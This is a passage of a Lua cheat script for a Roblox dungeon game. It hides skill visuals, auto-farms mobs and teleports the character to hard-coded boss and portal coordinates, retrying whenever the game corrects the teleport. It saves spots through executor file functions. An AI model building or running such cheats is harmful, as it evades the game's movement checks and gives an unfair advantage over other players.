    for _,object in ipairs(workspace:QueryDescendants("ParticleEmitter,Beam,Trail,Smoke,Fire,Sparkles,Light,BasePart,Decal,Texture,BillboardGui,SurfaceGui,Highlight,Sound"))do
        queue(object,false)
        if state.YieldStartup then state.YieldStartup()end
    end
    for _,model in ipairs(workspace:QueryDescendants("#AR,#Pistol"))do if model:IsA("Model")then gunModels[model]=os.clock()+5 end end
    function api.IsEffect(object)return effect(object)end
    function api.ProcessManaged()
        local dynamic=not ctx.DynamicHazards or ctx.DynamicHazards()
        local deadline=os.clock()+.0006
        local available=math.min(64,maintenanceTail-maintenanceHead+1)
        local processed=0
        while processed<available and (processed==0 or os.clock()<deadline)do
            local object=maintenance[maintenanceHead];maintenance[maintenanceHead]=nil;maintenanceHead+=1
            if object then maintenanceQueued[object]=nil end
            local record=object and managed[object]
            if record then
                local protect=false
                pcall(function()protect=object.Parent==nil or (dynamic or object.Parent~=record.Parent)and keep(object)or (object:IsA("BillboardGui")or object:IsA("SurfaceGui"))and keep(object)end)
                if protect then restore(object,record);managed[object]=nil
                else
                    record.Parent=object.Parent
                    for property,value in pairs(record.Hidden)do
                        local ok,current=pcall(function()return object[property]end)
                        if ok then
                            if typeof(value)=="NumberSequence"then
                                local points=current.Keypoints
                                if #points~=2 or points[1].Value~=1 or points[2].Value~=1 then write(object,property,value)end
                            elseif current~=value then write(object,property,value)end
                        end
                    end
                end
                if managed[object]then maintenanceNextTail+=1;maintenanceNext[maintenanceNextTail]=object;maintenanceQueued[object]=true end
            end
            processed+=1
        end
        if maintenanceHead>maintenanceTail then
            table.clear(maintenance);maintenance,maintenanceNext=maintenanceNext,maintenance
            maintenanceHead=1;maintenanceTail=maintenanceNextTail;maintenanceNextTail=0
        end
        return processed
    end
    function api.Update()
        if disposed or state.StopEverything then return end
        api.ProcessPending()
        local stamp=os.clock();if stamp<nextAnimation then return end;nextAnimation=stamp+.08
        local character=player.Character
        local humanoid=character and character:FindFirstChildOfClass("Humanoid")
        local current=humanoid and humanoid:FindFirstChildOfClass("Animator")
        if animator~=current then
            if animationConnection then animationConnection:Disconnect()end
            animator=current;animationConnection=nil
            if current then animationConnection=current.AnimationPlayed:Connect(function(track)
                hideTrack(track);task.defer(function()if not disposed and state.Running and track.IsPlaying then hideTrack(track)end end)
            end)end
        end
        if animator then for _,track in ipairs(animator:GetPlayingAnimationTracks())do hideTrack(track)end end
        for track,record in pairs(tracks)do
            if not track.IsPlaying then tracks[track]=nil
            elseif track.WeightCurrent>.001 or math.abs(track.WeightTarget-hiddenWeight)>.00001 then track:AdjustWeight(hiddenWeight,0)end
        end
        api.ProcessManaged();state.HiddenSkillAnimations=api.AnimationsHidden;state.HiddenSkillEffects=api.EffectsHidden
    end
    function api.Destroy()
        if disposed then return end
        disposed=true
        if animationConnection then animationConnection:Disconnect();animationConnection=nil end
        for _,connection in ipairs(connections)do connection:Disconnect()end;table.clear(connections)
        for track,record in pairs(tracks)do pcall(function()if track.IsPlaying then track:AdjustWeight(record.Weight,0)end end)end
        for object,record in pairs(managed)do if object.Parent then restore(object,record)end end
        table.clear(managed);table.clear(tracks);table.clear(gunModels);table.clear(ordinaryTracks)
        table.clear(maintenance);table.clear(maintenanceNext);table.clear(maintenanceQueued)
        maintenanceHead,maintenanceTail,maintenanceNextTail=1,0,0
        pending.Destroy();api.Pending=0;state.VisualQueueSize=0
    end
    api.Update()
    return api
end

-- END BUNDLED SKILL VISUALS
    end)()
    state.VisualPendingQueue=makeQueue(8192)
    state.SkillVisuals=create({Queue=state.VisualPendingQueue,
        State=state,Services=services,Actions=Actions,SkillState=Skills,
        DynamicHazards=function() return waveDodge.Event=="Lava" or waveDodge.Event=="Tempest" or (state.BossDodge and state.BossDodge.HasHazards) end,
        Preserve=function(instance)
            local node=instance
            while node and node~=workspace do
                if node.Name=="ActiveLavaHazard" or node.Name=="WaveDefenseStuff" or node.Name=="PillarSpawns" then return true end
                if node:IsA("BasePart") and waveDodge.IsHazardPart(node) then return true end
                node=node.Parent
            end
            return false
        end,
    })
end

-- Area coordinates remain usable when distance-based spawning removes the mob.
local destinations={}
local destinationsDirty=false
local function finitePoint(point)
    if typeof(point)~="Vector3"then return false end
    for _,value in ipairs({point.X,point.Y,point.Z})do if value~=value or math.abs(value)>=1000000 then return false end end
    return true
end
local function rememberDestination(id,name,kind,point)
    if not finitePoint(point)then return end
    local previous=destinations[id]
    if previous and previous.Name==name and previous.Kind==kind and (previous.Position-point).Magnitude<.01 then return end
    destinations[id]={Id=id,Name=name,Kind=kind,Position=point};destinationsDirty=true
end
if game.PlaceId==582198062 then rememberDestination("mob:Frogazoid","Frogazoid","Mini boss",Vector3.new(-154.811,1214.301,-758.796))end
if importedConfig and filePersistence then
    for floor,areas in pairs(importedConfig.CustomSpots or {})do
        writefile(configFolder.."/custom-spots_"..floor..".json",HttpService:JSONEncode({Version=1,PlaceId=tonumber(floor),Areas=areas}))
    end
end
local customSpotPath=configFolder.."/custom-spots_"..tostring(game.PlaceId)..".json"
local lastCustomSpots
if filePersistence then
    pcall(function()
        if not isfile(customSpotPath)then return end
        local raw=readfile(customSpotPath)
        assert(#raw<=32768,"Custom spots file exceeds size limit")
        local saved=HttpService:JSONDecode(raw)
        if saved.Version~=1 or saved.PlaceId~=game.PlaceId or type(saved.Areas)~="table"then return end
        for index,entry in ipairs(saved.Areas)do
            if index>20 then break end
            local at=entry.Position
            if type(entry.Id)=="string"and entry.Id:sub(1,16)=="saved:multispot:"and type(entry.Name)=="string"and type(at)=="table"
                and type(at[1])=="number"and type(at[2])=="number"and type(at[3])=="number"then
                rememberDestination(entry.Id,entry.Name,"Arena",Vector3.new(at[1],at[2],at[3]))
            end
        end
        lastCustomSpots=raw
    end)
end
-- Fixed destination coordinates from the supplied source, available before areas stream in.
do
    local supplied = ({
        [542351431] = { -- floor 1
            Boss = Vector3.new(-2977.1355, -229.28125, 1221.8555),
            Portal = Vector3.new(-2940.8562, -207.597794, 982.687012),
            Miniboss = Vector3.new(139.343933, 225.040985, -132.926147)
        },
        [548231754] = { -- floor 2
            Boss = Vector3.new(-2013.0431, 445.54346, -8953.9512),
            Portal = Vector3.new(-2181.09204, 466.482727, -8955.31055)
        },
        [555980327] = { -- floor 3
            Boss = Vector3.new(448.331146, 4279.3374, -385.050385),
            Portal = Vector3.new(-381.196564, 4184.99902, -327.238312)
        },
        [572487908] = { -- floor 4
            Boss = Vector3.new(-2318.12964, 2280.41992, -514.067749),
            Portal = Vector3.new(-2319.54028, 2091.30078, -106.37648),
            Miniboss = Vector3.new(-1361.35596, 5173.21387, -390.738007)
        },
        [580239979] = { -- floor 5
            Boss = Vector3.new(2189.17822, 1308.125, -121.071182),
            Portal = Vector3.new(2188.29614, 1255.37036, -407.864594)
        },
        [582198062] = { -- floor 7
            Boss = Vector3.new(3347.78955, 800.043884, -804.310425),
            Portal = Vector3.new(3336.35645, 747.824036, -614.307983)
        },
        [548878321] = { -- floor 8
            Boss = Vector3.new(1848.35413, 4110.43945, 7723.38623),
            Portal = Vector3.new(1665.46252, 4094.20312, 7722.29443),
            Miniboss = Vector3.new(-811.7854, 3179.59814, -949.255676)
        },
        [573267292] = { -- floor 9
            Boss = Vector3.new(12241.4648, 461.776215, -3655.09009),
            Portal = Vector3.new(12357.0059, 439.948914, -3470.23218),
            Miniboss = Vector3.new(1928, 2889, -11349),
            ['Second miniboss'] = Vector3.new(1973.94238, 2986.00952, -4486.8125)
        },
        [2659143505] = { -- floor 10
            Boss = Vector3.new(45.494194, 1003.77246, 25432.9902),
            Portal = Vector3.new(110.383698, 940.75531, 24890.9922),
            Miniboss = Vector3.new(-894.185791, 467.646698, 6505.85254)
        },
        [5287433115] = { -- floor 11
            Boss = Vector3.new(4916.49414, 2312.97021, 7762.28955),
            Portal = Vector3.new(5224.18994, 2602.94019, 6438.44678),
            Miniboss = Vector3.new(4801.12695, 1646.30347, 2083.19116),
            ['Za, the Eldest'] = Vector3.new(4001.55908, 421.515015, -3794.19727),
            ['Wa, the Curious'] = Vector3.new(4821.5874, 3226.32788, 5868.81787),
            ['Duality Reaper  '] = Vector3.new(4763.06934, 501.713593, -4344.83838),
            ['Neon chest       '] = Vector3.new(5204.35449, 2294.14502, 5778.00195)
        },
        [13965775911] = { -- Atheon / floor 13 (user-provided arena)
            ['Atheon arena'] = Vector3.new(840, 798, 336)
        },
        [6144637080] = { -- floor 12
            ['Suspended Unborn'] = Vector3.new(-5324.62305, 427.934784, 3754.23682),
            ['Limor the Devourer'] = Vector3.new(-1093.02625, -169.141785, 7769.1875),
            ['Radioactive Experiment'] = Vector3.new(-4643.86816, 425.090515, 3782.8252)
        }
    })[game.PlaceId] or {}
    local kinds = {Boss="Boss", Miniboss="Mini boss", ["Second miniboss"]="Mini boss", Portal="Exit", ["Atheon arena"]="Arena"}
    local names = {Boss="Boss area", Miniboss="Mini-boss area"}
    state.SourceDestinationCount = 0
    for originalName, point in pairs(supplied) do
        local name = string.match(originalName, "^%s*(.-)%s*$")
        local id = "source:" .. name
        rememberDestination(id, names[name] or name, kinds[name] or "Area", point)
        destinations[id].Source = "Provided source"
        state.SourceDestinationCount += 1
    end
end
local lastAreaPayload
local function saveDestinations()
    destinationsDirty=false
    if not filePersistence then return end
    local areas={}
    for id,entry in pairs(destinations)do
        if id:sub(1,16)=="saved:multispot:"then
            local at=entry.Position
            areas[#areas+1]={Id=id,Name=entry.Name,Position={at.X,at.Y,at.Z}}
        end
    end
    if #areas==0 then return end
    table.sort(areas,function(a,b)return a.Id<b.Id end)
    local ok,reason=pcall(function()
        local serialized=HttpService:JSONEncode({Version=1,PlaceId=game.PlaceId,Areas=areas})
        if serialized~=lastCustomSpots then writefile(customSpotPath,serialized);lastCustomSpots=serialized end
    end)
    state.CustomSpotSaveError=not ok and tostring(reason)or nil
end
local function rankMob(mob)
    local rank=targetPriority.Rank(mob)
    if rank==1 then return "Boss"end
    if rank==2 then return "Mini boss"end
end
local function discoverDestinations(onlyMobs)
    local wave=workspace:FindFirstChild("WaveDefenseStuff")
    if wave then
        local stage=tostring(workspace:GetAttribute("WaveDefenseEnvironment")or "")
        if stage~=state.DestinationEnvironment then
            for id in pairs(destinations)do if id:sub(1,4)=="mob:"or id=="wave:rift"then destinations[id]=nil;destinationsDirty=true end end
            state.DestinationEnvironment=stage
        end
        local marker=wave:FindFirstChild("RiftBossSpawn")
        if marker and stage:lower():find("rift",1,true)then rememberDestination("wave:rift","Rift boss spawn","Boss",marker.Position)end
    end
    if not onlyMobs then
    local portal=workspace:FindFirstChild("AtheonPortal")
    if portal and (portal:IsA("BasePart")or portal:IsA("Model"))then rememberDestination("map:AtheonPortal","Atheon Portal","Portal",portal:GetPivot().Position)
    elseif destinations["map:AtheonPortal"]then destinations["map:AtheonPortal"]=nil;destinationsDirty=true end
        local containers={workspace}
        for _,name in ipairs({"Models","OptimizedGame"})do local folder=workspace:FindFirstChild(name);if folder then containers[#containers+1]=folder end end
        local kinds={bossroom="Boss",bossarena="Boss",bossspawn="Boss",aspawnboss="Boss",minibossroom="Mini boss",minibossarena="Mini boss",
            minibossspawn="Mini boss",aspawnminiboss="Mini boss",entryroom="Dungeon",dungeonentrance="Dungeon",exitteleportroom="Exit",exitportal="Exit"}
        for _,container in ipairs(containers)do
            for _,object in ipairs(container:GetChildren())do
                if object:IsA("Model")or object:IsA("BasePart")then
                    local normalized=object.Name:lower():gsub("[^%w]","")
                    local room=normalized:match("^bigdungeonroom(%d+)$")
                    local kind=kinds[normalized]or room and "Dungeon"
                    if kind then
                        local label=room and "Room "..room or normalized=="aspawnboss"and "Boss spawn area"or normalized=="aspawnminiboss"and "Mini-boss spawn area"or object.Name=="BossRoom"and "Boss room"or object.Name
                        rememberDestination("map:"..object.Name,label,kind,object:GetPivot().Position)
                    end
                end
            end
        end
        local portals=workspace:FindFirstChild("CheckpointPortals")
        if portals then
            local positions={}
            for _,object in ipairs(portals:GetChildren())do if object:IsA("Model")or object:IsA("BasePart")then positions[#positions+1]=object:GetPivot().Position end end
            table.sort(positions,function(a,b)return a.X~=b.X and a.X<b.X or a.X==b.X and a.Z<b.Z end)
            for index,position in ipairs(positions)do rememberDestination("checkpoint:"..index,"Checkpoint "..index,"Checkpoint",position)end
        end
        local spawns=workspace:QueryDescendants("SpawnLocation")
        if #spawns>0 then
            local average=Vector3.zero
            for _,spawn in ipairs(spawns)do average+=spawn.Position end
            rememberDestination("spawn","Floor spawn","Spawn",average/#spawns)
        end
    end
    for mob in pairs(trackedMobs)do
        if mob.Parent then
            local kind=rankMob(mob);local root=mob:FindFirstChild("HumanoidRootPart")
            local id="mob:"..mob.Name
            if kind and root and (not destinations[id]or wave)then rememberDestination(id,mob.Name,kind,root.Position)end
        end
    end
    state.FloorDestinations=destinations;saveDestinations()
end
local floorName = "Floor " .. tostring(game.PlaceId)
pcall(function()
    for _, floor in ipairs(require(ReplicatedStorage.Database.Locations).floors) do
        if floor.PlaceId == game.PlaceId then floorName = floor.Name; break end
    end
end)
state.FloorName = floorName
function state.ReadAutomationEncounter(spot)
    local remembered=state.MultiSpotEncounter or {}
    state.MultiSpotEncounter=remembered
    local now=os.clock()
    local function eligible(mob)return not state.BossOnly or targetPriority.Rank(mob)<=2 end
    local function living(data)return not data or data.Health.Value>0 and (not data.HitLives or data.HitLives.Value>0)end
    local function collect()
        state.MultiSpotNextScan=now+1
        for mob in pairs(trackedMobs)do
            if mob.Parent and eligible(mob)then
                local data=getMobData(mob)
                local root=data and data.Root or mob:FindFirstChild("HumanoidRootPart")or mob.PrimaryPart or mob:FindFirstChild("RootPart")
                local belongs=root and ((spot.EncounterNames and spot.EncounterNames[mob.Name])or (root.Position-spot.Position).Magnitude<=220)
                if belongs and living(data)then remembered[mob]=true end
                if not data then state.MultiSpotNextScan=math.min(state.MultiSpotNextScan,now+.1)end
            end
        end
    end
    local function summarize()
        local count,seen=0,false
        for mob in pairs(remembered)do
            if not mob.Parent then remembered[mob]=nil;seen=true
            elseif eligible(mob)then
                seen=true
                if living(getMobData(mob))then count+=1 else remembered[mob]=nil end
            end
        end
        return count,seen
    end
    local refreshed=now>=(state.MultiSpotNextScan or 0)
    if refreshed then collect()end
    local alive,observed=summarize()
    if alive==0 and not refreshed then
        collect();local count,seen=summarize();alive=count;observed=observed or seen
    end
    return alive,observed
end

do
    local make=(function()
-- BEGIN BUNDLED RESPAWN SCHEDULE
-- A respawn record advances only after a living sample is observed dead.
return function(ctx)
    local api={Records={},NameNormalizations=0}
    local due=0
    local definitions=setmetatable({}, {__mode="k"})
    local normalized=setmetatable({}, {__mode="k"})
    local function name(text)
        api.NameNormalizations+=1
        return tostring(text or ""):lower():gsub("[^%w]","")
    end
    local function describe(spot)
        local old=definitions[spot]
        if old and old.Name==spot.Name and old.Source==spot.EncounterNames then return old end
        local definition={Name=spot.Name,Source=spot.EncounterNames,Keys={},Count=0}
        if spot.EncounterNames then
            for key in pairs(spot.EncounterNames)do local value=name(key);definition.Keys[value]=true;definition.Only=value;definition.Count+=1 end
        else definition.Only=name(spot.Name);definition.Keys[definition.Only]=true;definition.Count=1 end
        definitions[spot]=definition;return definition
    end
    local function match(spot,sample,definition)
        local found=sample.Model and normalized[sample.Model]
        if not found or found.Name~=sample.Name then
            found={Name=sample.Name,Key=name(sample.Name)}
            if sample.Model then normalized[sample.Model]=found end
        end
        if definition.Keys[found.Key]then return found.Key end
        if definition.Count~=1 or not spot.Position or not sample.Position then return nil end
        local a,b=spot.Position,sample.Position
        if (a.X-b.X)^2+(a.Y-b.Y)^2+(a.Z-b.Z)^2<=48400 then return definition.Only end
    end
    local function observe(record,key,sample,seconds,now)
        local slot=record.Slots[key]
        if not slot or slot.Model~=sample.Model then slot={Model=sample.Model};record.Slots[key]=slot end
        if sample.Health>0 and (sample.HitLives==nil or sample.HitLives>0)then
            slot.WasAlive=true;slot.Dead=false;slot.DueAt=nil
        elseif slot.WasAlive and not slot.Dead then
            slot.Dead=true;slot.KilledAt=now
            slot.DueAt=ctx.Deadline and ctx.Deadline(now,seconds)or now+seconds
        end
    end
    function api.Update(now,spots)
        if now<due then return end
        due=now+.1
        local floor=ctx.CurrentFloor();local samples
        for _,spot in ipairs(spots)do
            local seconds=spot.RespawnSeconds
            if spot.PlaceId==floor and type(seconds)=="number"and seconds>0 then
                if not samples then samples=ctx.Samples()end
                local record=api.Records[spot.Id]
                if not record then record={Slots={}};api.Records[spot.Id]=record end
                local definition=describe(spot)
                for _,sample in ipairs(samples)do
                    local key=match(spot,sample,definition)
                    if key then observe(record,key,sample,seconds,now)end
                end
                record.HasLive=false;record.DueAt=nil
                for _,slot in pairs(record.Slots)do
                    record.HasLive=record.HasLive or (slot.WasAlive and not slot.Dead)or false
                    if slot.DueAt then record.DueAt=math.min(record.DueAt or math.huge,slot.DueAt)end
                    if slot.KilledAt then record.KilledAt=math.max(record.KilledAt or -math.huge,slot.KilledAt)end
                end
            end
        end
    end
    function api.Get(spot)return api.Records[spot.Id]end
    return api
end

-- END BUNDLED RESPAWN SCHEDULE
    end)()
    state.MultiSpotRespawns=make({Deadline=state.FarmCoordination and state.FarmCoordination.Deadline,CurrentFloor=function()return game.PlaceId end,Samples=function()
        local result={}
        for mob in pairs(trackedMobs)do
            if mob.Parent and targetPriority.Rank(mob)<=2 then
                local data=getMobData(mob)
                if data then result[#result+1]={Model=mob,Name=mob.Name,Position=data.Root.Position,
                    Health=data.Health.Value,HitLives=data.HitLives and data.HitLives.Value}end
            end
        end
        return result
    end})
end
function state.RegisterAutomationDestination(spot)
    if spot.PlaceId~=game.PlaceId then return false end
    local id=spot.DestinationId
    local saved=destinations[id]
    if not saved then rememberDestination(id,spot.Name,spot.Kind,spot.Position)
    else
        if spot.MainBoss or spot.PositionLocked then rememberDestination(id,saved.Name,spot.Kind,spot.Position)end
        if id:sub(1,4)=="mob:"then saved.Name=id:sub(5)end
    end
    return true
end
travelHeading.Text = "TELEPORTS · " .. floorName
travelHeading.TextTruncate = Enum.TextTruncate.AtEnd

do
    local make=(function()
-- BEGIN BUNDLED ARENA TRAVEL
-- Arena travel is a cancellable staging/probe/settle transaction.
return function(ctx)
    local api={}
    function api.Move(point,_automatic,active)
        local character,root,humanoid=ctx.Character()
        assert(character and root and humanoid and humanoid.Health>0 and not root.Anchored,"Character is not ready")
        local function validate()
            local current=ctx.Character()
            assert(active()and current==character and root.Parent~=nil and humanoid.Health>0,"Travel cancelled")
        end
        local destination=point-Vector3.new(0,20,0)
        validate();assert(ctx.Valid(destination),"Invalid arena position")
        ctx.Hold(character,root,humanoid,destination)
        local ground
        for attempt=1,4 do
            validate()
            if ctx.Stream then pcall(ctx.Stream,point,attempt==1 and 2 or .5)end
            validate();ground=ctx.Surface(point)
            if not ground and ctx.MapDeleted and ctx.MapDeleted()then ground=point end
            if ground then break end
            ctx.Wait(.15)
        end
        assert(ground,"Arena collision has not streamed in yet")
        validate();assert(ctx.Valid(destination),"Landing surface is too low")
        local expires,settled=ctx.Clock()+2,nil
        while true do
            validate();ctx.Hold(character,root,humanoid,destination);ctx.Wait(.1);validate()
            local now=ctx.Clock()
            if (root.Position-destination).Magnitude<=3 then
                settled=settled or now
                if now-settled>=.3 then return {Position=destination,SurfaceY=ground.Y,Character=character}end
            else settled=nil end
            if now>=expires then break end
        end
        error("The game corrected this teleport; retrying the same arena")
    end
    return api
end

-- END BUNDLED ARENA TRAVEL
    end)()
    state.ArenaTravel=make({Clock=os.clock,Wait=task.wait,
        MapDeleted=function()return state.PerformanceBoosters["Delete map"]or state.PerformanceBoosters["Remove everything"]end,
        Character=function()
            local character=player.Character
            return character,character and character:FindFirstChild("HumanoidRootPart"),character and character:FindFirstChildOfClass("Humanoid")
        end,
        Valid=function(point)return finitePoint(point) and point.Y>workspace.FallenPartsDestroyHeight+30 end,
        Stream=function(point,timeout)player:RequestStreamAroundAsync(point,timeout)end,
        Surface=function(point)
            local character=player.Character
            local params=RaycastParams.new()
            params.FilterType=Enum.RaycastFilterType.Exclude
            params.FilterDescendantsInstances={character,workspace:FindFirstChild("Mobs") or character,workspace:FindFirstChild("Characters") or character}
            params.RespectCanCollide=true;params.IgnoreWater=false
            local hit=workspace:Raycast(point+Vector3.new(0,8,0),Vector3.new(0,-320,0),params)
            if not hit then hit=workspace:Raycast(point+Vector3.new(0,96,0),Vector3.new(0,-480,0),params) end
            if hit and hit.Normal.Y>=.65 and hit.Material~=Enum.Material.Water then return hit.Position end
        end,
        Hold=function(character,root,humanoid,point)
            ensureMovementController(character,root,humanoid,point)
            positionAlign.Enabled=true;positionAlign.Position=point
            if orientationAlign then orientationAlign.Enabled=true end
            if (root.Position-point).Magnitude>1 then pivotRoot(root,point) end
        end,
    })
end
do
    local make=(function()
-- BEGIN BUNDLED ARENA FLOAT
-- Own a single vertical-velocity constraint for the current character root.
return function(ctx)
    local api={}
    local owned
    local due=0
    function api.Release()
        local record=owned;owned=nil;api.Root=nil
        if not record then return end
        record.Velocity:Destroy();record.Attachment:Destroy()
    end
    function api.Attach(root)
        if (ctx.Active and not ctx.Active())then api.Release();return end
        if root.Anchored then return end
        if owned and api.Root==root and owned.Velocity.Parent then return end
        api.Release()
        local anchor=ctx.Create("Attachment",{Name="SB2ArenaFloatAttachment"},root)
        local velocity=ctx.Create("LinearVelocity",{Name="SB2ArenaFloat",Attachment0=anchor,
            RelativeTo=Enum.ActuatorRelativeTo.World,VelocityConstraintMode=Enum.VelocityConstraintMode.Line,
            LineDirection=Vector3.new(0,1,0),LineVelocity=0,ForceLimitsEnabled=false},root)
        owned={Attachment=anchor,Velocity=velocity};api.Root=root;due=0
    end
    function api.Update(now)
        if ctx.Active and not ctx.Active()then api.Release();return end
        if not owned then return end
        local root=api.Root
        if not root.Parent or root.Anchored or ctx.Root()~=root then api.Release();return end
        if now>=due then owned.Velocity.LineVelocity=0;due=now+.5 end
    end
    api.Destroy=api.Release
    return api
end

-- END BUNDLED ARENA FLOAT
    end)()
    state.ArenaFloat=make({Create=create,Workspace=workspace,Active=function()return state.AutoFarm end,Root=function()
        local character=player.Character
        return character and character:FindFirstChild("HumanoidRootPart")
    end})
end
function state.FinishMultiSpotArrival()
    state.TravelHold=false;state.TravelHoldPosition=nil;state.MultiSpotLandingPosition=nil
    if not state.AutoFarm then stopMovement("Manual controls restored")end
    return true
end
function state.HoldMultiSpotIdle()
    local blocked=not state.AutoFarm or not state.MultiSpot or state.MultiSpotPriorityActive or not state.MultiSpotAnchor
        or state.StopEverything or state.SafeModePanic or state.TravelBusy or state.MultiSpotOwnsTravel or state.Dodging or state.Recovering
    local spot=state.MultiSpotController and state.MultiSpotController.Current
    if blocked or not spot or state.ReadAutomationEncounter(spot)~=0 then state.MultiSpotEmptySince=nil;return false end
    if state.MultiSpotEmptyAnchor~=state.MultiSpotAnchor then state.MultiSpotEmptyAnchor=state.MultiSpotAnchor;state.MultiSpotEmptySince=nil end
    local now=os.clock();state.MultiSpotEmptySince=state.MultiSpotEmptySince or now
    if now-state.MultiSpotEmptySince<5 then return false end
    local character=player.Character;local root=character and character:FindFirstChild("HumanoidRootPart")
    local human=character and character:FindFirstChildOfClass("Humanoid")
    if not root or root.Anchored or not human or human.Health<=0 then return false end
    waveDodge.Idle(state.MultiSpotAnchor);return true
end
function state.TeleportToDestination(id,urgent,automatic)
    if state.SafeModePanic or state.StopEverything or state.TravelBusy or not state.Running then return false,"Another movement has priority"end
    discoverDestinations()
    local area=destinations[id]
    if not area then setTravelStatus("Area not located on this floor yet");return false,"Arena is not available"end
    local serial=(state.TravelSerial or 0)+1
    state.TravelSerial=serial;state.TravelBusy=true;state.MultiSpotTravelPending=automatic==true;state.TravelStartedAt=os.clock()
    state.LastTravelDestination=nil;state.LastTravelPosition=nil;state.TravelError=nil
    setTravelOpen(false)
    if automatic and state.CancelSkillAura then state.CancelSkillAura("Moving to next selected arena")end
    stopMovement("Travelling · farming will resume",true)
    task.spawn(function()
        state.TravelWorker=coroutine.running()
        local function current()return state.Running and not state.SafeModePanic and not state.StopEverything and state.TravelSerial==serial end
        local ok,reason=pcall(function()
            local deadline=os.clock()+4
            while current()and (state.Recovering or state.SkillCastRunning)and os.clock()<deadline do task.wait(.05)end
            if not current()then return end
            assert(not state.Recovering and not state.SkillCastRunning,"Wait for the current movement or skill to finish")
            setTravelStatus("Loading "..area.Name.."...")
            local landing=state.ArenaTravel.Move(area.Position,automatic==true,current)
            if not current()then return end
            local at=landing.Position
            state.LastTravelLanding={SourcePosition=area.Position,SurfaceY=landing.SurfaceY,Requested=at,Actual=at,Depth=landing.SurfaceY-at.Y}
            state.LastTravelDestination=id;state.LastTravelPosition=at;state.MultiSpotLandingPosition=automatic and at or nil
            state.TeleportsSent+=1;state.TravelHold=automatic==true or not(state.AutoFarm and state.Enabled)
            state.TravelHoldPosition=state.TravelHold and at or nil
            if area.Kind=="Boss"or area.Kind=="Mini boss"then state.TravelFocus={Kind=area.Kind,Name=id:sub(1,4)=="mob:"and area.Name or nil,Until=os.clock()+8};state.FollowTarget=nil end
            setTravelStatus("Arrived: "..area.Name.." · 20 studs below position")
            local multi=state.MultiSpotController
            if automatic and multi and multi.Current then local _,seen=state.ReadAutomationEncounter(multi.Current);if seen then multi.EncounterSeen=true end end
            lastSurfaceY=landing.SurfaceY+4
        end)
        if state.TravelSerial~=serial then return end
        state.TravelBusy=false;state.MultiSpotTravelPending=false;state.TravelStartedAt=nil;state.TravelWorker=nil
        if not ok then stopMovement("Travel will retry",true);state.TravelError=tostring(reason);setTravelStatus(state.TravelError);return end
        if automatic and state.MultiSpotOwnsTravel and state.MultiSpotController then
            local confirmed,error=pcall(state.MultiSpotController.Update,state.FarmClock())
            if not confirmed then state.MultiSpotController.Pause(tostring(error))end
        end
    end)
    return true
end
local function refreshTravelChoices()
    discoverDestinations()
    state.FloorDestinations=destinations
end
function state.SaveCurrentMiniBossArea()
    if state.StopEverything then return false end
    local root=player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return false end
    rememberDestination("saved:mini","Saved mini-boss area","Mini boss",root.Position)
    saveDestinations();refreshTravelChoices();setTravelStatus("Mini-boss area saved for "..floorName)
    return true
end
function state.SaveMultiSpot()
    if state.StopEverything or state.TravelBusy or state.AutomationTeleporting then return false end
    local root=player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return false end
    local point=root.Position;local floor=waveDodge.FloorY(point)
    if type(floor)=="number"then point=Vector3.new(point.X,floor,point.Z)end
    if not finitePoint(point)then return false end
    local count=0;for id in pairs(destinations)do if id:sub(1,16)=="saved:multispot:"then count+=1 end end
    if count==20 then state.MultiSpotStatus="Saved spot limit reached (20 per floor)";return false end
    local id="saved:multispot:"..HttpService:GenerateGUID(false)
    rememberDestination(id,"Saved Spot "..(count+1),"Arena",point)
    state.FloorDestinations=destinations;saveDestinations()
    if state.AutomationCatalog then state.AutomationCatalog.AddCurrent(destinations,game.PlaceId);state.AutomationCatalog.Sort()end
    state.MultiSpotStatus="Saved Spot "..(count+1).." saved · select it in arenas"
    if state.RefreshAutomationUI then state.RefreshAutomationUI()end
    return true
end
state.RefreshTeleportDestinations=refreshTravelChoices
refreshTravelChoices()
local nextAreaDiscovery=0

local function updateMovement(now)
    now=now or os.clock()
    if now<nextMovementUpdate then return end
    nextMovementUpdate=now+.08
    if not state.MovementOwnership.CanFarm(now)then return end
    if not state.AutoFarm then
        if state.Moving or state.TravelHold or (state.ArenaFloat and state.ArenaFloat.Root)then stopMovement("Manual controls restored")end
        return
    end
    state.TravelHold=false;state.TravelHoldPosition=nil
    local character=player.Character
    local root=character and character:FindFirstChild("HumanoidRootPart")
    local humanoid=character and character:FindFirstChildOfClass("Humanoid")
    local entity=character and character:FindFirstChild("Entity")
    local health=entity and entity:FindFirstChild("Health")
    local mobs=refreshMobIndex()
    if not root or not humanoid or humanoid.Health<=0 or (health and health.Value<=0)or not mobs then state.FollowTarget=nil;stopMovement("Waiting for a living character");return end
    if movementRoot and movementRoot~=root then stopMovement();return end
    local previous=state.FarmTargetLock or state.FollowTarget
    local previousData=previous and getMobData(previous)
    local targetDefeated=previousData and (previousData.Health.Value<=0 or previousData.HitLives and previousData.HitLives.Value<=0)
    if not state.AccountProgression then
        local common=state.GetFarmPriorityTarget(now)
        if common and common~=previous and (not previous or targetPriority.FarmLess(common,previous))then
            if state.SkillCastRunning and state.CancelSkillAura then state.CancelSkillAura("Synchronizing farm target")end
            state.FarmTargetLock=common;state.FollowTarget=common;state.FarmLockArena=state.MultiSpotAnchor;state.FarmLockProgression=state.ProgressionBossMob;nextAcquisition=0
        end
    end
    if state.SkillCastRunning then
        if not targetDefeated then return end
        state.CancelSkillAura("Farm target defeated")
    end
    if Skills.usingSkill~="none"then
        if positionAlign then positionAlign.Enabled=false end
        if orientationAlign then orientationAlign.Enabled=false end
        state.SkillMovementSuspended=true;movementStatus("Casting "..tostring(state.SelectedSkill));return
    end
    if state.SkillMovementSuspended then state.SkillMovementSuspended=false;teleportTarget=nil;state.OffsetGraceUntil=now+.5 end
    if now<state.LagPauseUntil or (state.PingMs and state.PingMs>500)then pauseHold("Paused in place · waiting for lag");return end
    if root.Anchored or humanoid.SeatPart then stopMovement("Paused · character cannot move");return end
    if character:GetAttribute("Disabled")then pauseHold("Paused in place · character disabled");return end
    if holdPaused then holdPaused=false;teleportTarget=nil;state.OffsetGraceUntil=now+.5 end
    local targetRoot=validMob(state.FollowTarget,mobs)
    if targetRoot and (targetRoot.Position-root.Position).Magnitude>state.FarmRange+math.abs(state.TeleportOffset)+4 then targetRoot=nil end
    -- BEGIN TEST FARM SELECTION
    if targetDefeated then nextAcquisition=0 end
    if now>=nextAcquisition and (targetDefeated or not state.FarmCoordination or state.FarmCoordination.Ready("target"))then
